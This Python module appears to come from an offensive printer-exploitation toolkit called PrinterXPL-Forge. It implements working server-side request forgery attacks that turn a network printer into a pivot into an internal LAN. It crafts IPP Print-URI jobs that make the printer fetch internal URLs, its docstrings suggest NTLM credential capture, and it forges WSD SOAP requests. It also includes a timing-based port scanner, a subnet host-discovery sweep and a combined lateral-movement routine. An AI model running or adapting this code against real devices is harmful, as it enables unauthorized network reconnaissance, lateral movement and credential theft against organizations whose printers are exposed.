#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterXPL-Forge  -  SSRF Pivot / Lateral Movement Module
======================================================
Uses the printer as a network pivot point to:
  1. Probe internal hosts/ports the attacker cannot reach directly
  2. Exfiltrate data by instructing the printer to fetch internal URLs
  3. Identify alive hosts and open services on the internal LAN
  4. Use WSD (Web Services for Devices) SOAP for SSRF
  5. Use IPP print-by-reference (fetch document from internal URL)
  6. Use HTTP redirect in printer web interface for SSRF

Attack chain:
  Attacker → Printer (accessible) → Internal target (not accessible directly)
              [SSRF vector]

Vectors implemented:
  A. IPP print-by-reference        -  printer fetches URL as print job data
  B. WSD SOAP SSRF                 -  SOAP GET to arbitrary internal host
  C. Web UI SSRF                   -  some printers accept internal URLs for scan-to-email
  D. Timed SSRF port scanner       -  measure response time to infer port open/closed
  E. DNS rebinding helper          -  generate payload for time-of-check attacks
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike

from __future__ import annotations

import logging
import socket
import struct
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

_log = logging.getLogger(__name__)


# ── SSRF result dataclass ──────────────────────────────────────────────────────

class PortState:
    OPEN     = 'open'
    CLOSED   = 'closed'
    FILTERED = 'filtered'
    UNKNOWN  = 'unknown'


# ── A. IPP print-by-reference SSRF ───────────────────────────────────────────

def ipp_fetch_url(
    printer_host: str,
    printer_port: int,
    printer_path: str,
    target_url:   str,
    scheme:       str   = 'https',
    timeout:      float = 15,
    dry_run:      bool  = True,
) -> Dict:
    """
    Use IPP Print-URI (op 0x0003) to instruct the printer to fetch *target_url*.

    The printer will make an outbound HTTP/HTTPS request to *target_url* and
    attempt to print the response. The attacker can:
      - Host a listener to capture the request (confirms SSRF)
      - Point to internal services to exfiltrate their HTTP responses
        (via error messages in IPP response or timing)
      - Point to an NTLM endpoint for credential capture

    Args:
        target_url: URL the printer should fetch (e.g. http://192.168.1.1:8080/).
        dry_run:    If True, cancel the job immediately after submission.

    Returns:
        dict with keys: submitted, status_code, response_hints, timing_ms.
    """
    import struct as _s

    result = {
        'vector':        'IPP print-by-reference',
        'target_url':    target_url,
        'submitted':     False,
        'status_code':   None,
        'response_hints': [],
        'timing_ms':     None,
    }

    printer_uri = f"ipp://{printer_host}{printer_path}"

    def _attr(tag, name, value):
        nb = name.encode()
        vb = value.encode() if isinstance(value, str) else value
        return bytes([tag]) + _s.pack('>H', len(nb)) + nb + _s.pack('>H', len(vb)) + vb

    body  = b'\x01\x01'
    body += _s.pack('>H', 0x0003)       # Print-URI
    body += _s.pack('>I', 1)
    body += b'\x01'
    body += _attr(0x47, 'attributes-charset',          'utf-8')
    body += _attr(0x48, 'attributes-natural-language', 'en')
    body += _attr(0x45, 'printer-uri',                 printer_uri)
    body += _attr(0x45, 'document-uri',                target_url)  # fetch this URL
    body += _attr(0x44, 'document-format',             'application/octet-stream')
    body += _attr(0x42, 'job-name',                    'pivot-test')
    body += b'\x03'

    t0 = time.monotonic()
    try:
        r = requests.post(
            f"{scheme}://{printer_host}:{printer_port}{printer_path}",
            data=body,
            headers={'Content-Type': 'application/ipp'},
            timeout=timeout, verify=False,
        )
        elapsed_ms = round((time.monotonic() - t0) * 1000)
        result['timing_ms']   = elapsed_ms
        result['status_code'] = r.status_code

        if r.status_code in (200, 400):
            status_word = struct.unpack('>H', r.content[2:4])[0] if len(r.content) >= 4 else 0
            result['submitted'] = status_word < 0x0400

            # Extract any error messages that might reveal internal host state
            text = r.content.decode('latin-1', errors='replace')
            for hint in ['connection refused', 'no route', 'timeout',
                         'connect', 'error', 'unreachable', 'refused']:
                if hint.lower() in text.lower():
                    result['response_hints'].append(hint)

    except requests.Timeout:
        result['timing_ms'] = int((time.monotonic() - t0) * 1000)
        result['response_hints'].append('timeout  -  target may be alive (filtered)')
    except Exception as exc:
        result['response_hints'].append(str(exc)[:60])

    return result


# ── B. WSD SOAP SSRF ──────────────────────────────────────────────────────────

def wsd_soap_ssrf(
    printer_host: str,
    target_host:  str,
    target_port:  int  = 80,
    target_path:  str  = '/',
    timeout:      float = 8,
) -> Dict:
    """
    Craft a WSD (Web Services for Devices) SOAP request where the printer
    will forward a SOAP Get to *target_host:target_port*.

    The printer's WSD service acts as an unintended HTTP proxy.
    Observing response timing and error codes reveals:
      - Whether the internal host is alive
      - Whether the port is open or closed
    """
    import uuid as _uuid

    result = {
        'vector':     'WSD SOAP SSRF',
        'target':     f'http://{target_host}:{target_port}{target_path}',
        'alive':      None,
        'timing_ms':  None,
        'hints':      [],
    }

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/09/transfer">
  <s:Header>
    <a:To>http://{target_host}:{target_port}{target_path}</a:To>
    <a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Get</a:Action>
    <a:MessageID>urn:uuid:{_uuid.uuid4()}</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
  </s:Header>
  <s:Body/>
</s:Envelope>"""

    for wsd_path in ('/WSD/DEVICE', '/wsd/device'):
        try:
            t0 = time.monotonic()
            r  = requests.post(
                f'http://{printer_host}{wsd_path}',
                data=soap.encode(),
                headers={'Content-Type': 'application/soap+xml; charset=utf-8',
                         'SOAPAction': '""'},
                timeout=timeout,
            )
            elapsed = round((time.monotonic() - t0) * 1000)
            result['timing_ms'] = elapsed
            result['alive']     = True
            text = r.text.lower()
            for h in ['error', 'unreachable', 'refused', 'connect', 'timeout']:
                if h in text:
                    result['hints'].append(h)
            break
        except requests.Timeout:
            result['timing_ms'] = timeout * 1000
            result['hints'].append('printer WSD timed out (or WSD not available)')
        except Exception as exc:
            result['hints'].append(str(exc)[:60])

    return result


# ── C. Timed SSRF port scanner ────────────────────────────────────────────────

def ssrf_port_scan(
    printer_host: str,
    printer_port: int,
    printer_path: str,
    target_host:  str,
    ports:        List[int]  = None,
    scheme:       str        = 'https',
    timeout:      float      = 6,
    workers:      int        = 5,
    verbose:      bool       = True,
) -> Dict[int, str]:
    """
    Scan internal ports via IPP print-by-reference SSRF timing analysis.

    Method:
      - Open port  → printer establishes TCP connection → response < timeout
      - Closed port → printer gets TCP RST immediately → response in ~100ms
      - Filtered   → printer times out → response ≈ timeout

    Args:
        target_host: Internal IP to scan (unreachable from attacker directly).
        ports:       Ports to test (default: common service ports).

    Returns:
        dict {port: state} where state is 'open'|'closed'|'filtered'.
    """
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389,
                 443, 445, 3306, 3389, 5432, 8080, 8443, 9100, 27017]

    results: Dict[int, str] = {}

    def _probe(port: int) -> Tuple[int, str]:
        target_url = f"http://{target_host}:{port}/"
        res = ipp_fetch_url(
            printer_host, printer_port, printer_path,
            target_url, scheme=scheme, timeout=timeout, dry_run=True,
        )
        ms = res.get('timing_ms') or timeout * 1000

        if ms < timeout * 300:       # responded fast → RST (closed) or data (open)
            if res['submitted']:
                return port, PortState.OPEN
            elif 'refused' in ' '.join(res['response_hints']).lower():
                return port, PortState.CLOSED
            else:
                return port, PortState.OPEN
        elif ms >= timeout * 900:    # close to timeout → filtered
            return port, PortState.FILTERED
        else:
            return port, PortState.UNKNOWN

    if verbose:
        print(f"  [SSRF] Port scanning {target_host} via printer {printer_host} "
              f"({len(ports)} ports) ...")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_probe, p): p for p in ports}
        for f in as_completed(futures):
            port, state = f.result()
            results[port] = state
            if verbose and state in (PortState.OPEN,):
                print(f"  [SSRF]   {target_host}:{port:5d}  \033[1;32mOPEN\033[0m")

    return results


# ── D. Internal network host discovery ────────────────────────────────────────

def discover_internal_hosts(
    printer_host: str,
    printer_port: int,
    printer_path: str,
    subnet:       str   = None,
    scheme:       str   = 'https',
    timeout:      float = 4,
    probe_port:   int   = 80,
    verbose:      bool  = True,
) -> List[str]:
    """
    Probe each host in *subnet* for a single *probe_port* to identify alive hosts.

    If *subnet* is None, it is derived from the printer's own IP (e.g. 192.168.0.0/24).

    Returns list of likely-alive internal IP addresses.
    """
    if subnet is None:
        parts = printer_host.rsplit('.', 1)
        if len(parts) == 2:
            subnet = parts[0] + '.0/24'

    # Parse subnet
    try:
        base, bits = subnet.split('/')
        base_parts  = list(map(int, base.split('.')))
        host_count  = 2 ** (32 - int(bits)) - 2
        first_host  = base_parts[:3] + [base_parts[3] + 1]
    except Exception:
        _log.warning("Cannot parse subnet %r  -  using /24 from printer IP", subnet)
        parts       = printer_host.rsplit('.', 1)
        first_host  = list(map(int, parts[0].split('.'))) + [1]
        host_count  = 254

    alive = []
    if verbose:
        print(f"  [PIVOT] Probing {subnet or printer_host+'.0/24'} "
              f"via printer SSRF (port {probe_port}) ...")

    def _check(ip: str) -> Optional[str]:
        if ip == printer_host:
            return None
        target_url = f"http://{ip}:{probe_port}/"
        res = ipp_fetch_url(
            printer_host, printer_port, printer_path,
            target_url, scheme=scheme, timeout=timeout, dry_run=True,
        )
        ms = res.get('timing_ms') or timeout * 1000
        # Fast response → host likely alive (RST or actual data)
        if ms < timeout * 400:
            return ip
        return None

    # Generate IP list
    ips = []
    for i in range(1, min(host_count + 1, 255)):
        ip_parts = first_host[:3] + [first_host[3] - 1 + i]
        if all(0 <= p <= 255 for p in ip_parts):
            ips.append('.'.join(map(str, ip_parts)))

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(_check, ip): ip for ip in ips}
        for f in as_completed(futures):
            result = f.result()
            if result:
                alive.append(result)
                if verbose:
                    print(f"  [PIVOT]   \033[1;32m{result}\033[0m likely alive")

    return sorted(alive)


# ── E. Full pivot audit ────────────────────────────────────────────────────────

def pivot_audit(
    printer_host: str,
    printer_port: int   = 631,
    printer_path: str   = '/ipp/print',
    scheme:       str   = 'https',
    timeout:      float = 10,
    verbose:      bool  = True,
) -> Dict:
    """
    Run a complete pivot/lateral-movement assessment using the printer as proxy.

    Checks:
      1. IPP print-by-reference SSRF capability
      2. WSD SOAP SSRF capability
      3. Internal network host discovery (printer's subnet)
      4. Gateway and common internal services

    Returns structured results.
    """
    results = {
        'printer':         printer_host,
        'ssrf_ipp':        None,
        'ssrf_wsd':        None,
        'internal_hosts':  [],
        'gateway_probe':   None,
        'risk':            [],
    }

    if verbose:
        print(f"\n  [PIVOT] Lateral movement assessment via {printer_host}")

    # 1. IPP SSRF  -  probe localhost (printer itself)
    local_res = ipp_fetch_url(
        printer_host, printer_port, printer_path,
        'http://127.0.0.1:80/', scheme=scheme, timeout=timeout, dry_run=True,
    )
    results['ssrf_ipp'] = local_res
    if local_res['submitted']:
        results['risk'].append('IPP_SSRF_CAPABLE')
        if verbose:
            print("  [PIVOT] \033[1;31m[VULN]\033[0m IPP print-by-reference SSRF confirmed")
            print(f"          Printer fetched http://127.0.0.1:80/  -  "
                  f"timing={local_res['timing_ms']}ms")

    # 2. WSD SSRF  -  probe a well-known internal address
    gateway = printer_host.rsplit('.', 1)[0] + '.1'
    wsd_res  = wsd_soap_ssrf(printer_host, gateway, 80, '/', timeout)
    results['ssrf_wsd']     = wsd_res
    results['gateway_probe'] = gateway
    if wsd_res['alive'] or (wsd_res['timing_ms'] and wsd_res['timing_ms'] < 3000):
        results['risk'].append('WSD_SSRF_CAPABLE')
        if verbose:
            print(f"  [PIVOT] WSD SOAP responded  -  gateway {gateway} probed "
                  f"(timing={wsd_res['timing_ms']}ms)")

    # 3. Discover alive hosts in the same /24
    if 'IPP_SSRF_CAPABLE' in results['risk']:
        alive = discover_internal_hosts(
            printer_host, printer_port, printer_path, scheme=scheme,
            timeout=max(timeout / 2, 3), verbose=verbose,
        )
        results['internal_hosts'] = alive
        if alive:
            results['risk'].append(f'INTERNAL_HOSTS_FOUND:{len(alive)}')

    return results
